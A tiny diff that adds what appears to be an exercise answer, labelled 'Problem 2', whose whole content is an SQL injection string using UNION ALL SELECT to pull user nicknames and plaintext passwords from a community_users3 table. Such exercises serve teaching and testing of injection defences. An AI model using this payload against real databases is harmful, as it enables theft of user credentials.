@@ -1,0 +1,5 @@
+Problem 2:
+
+Input string:
+
+' UNION ALL SELECT nick,password_plaintext  FROM community_users3; --
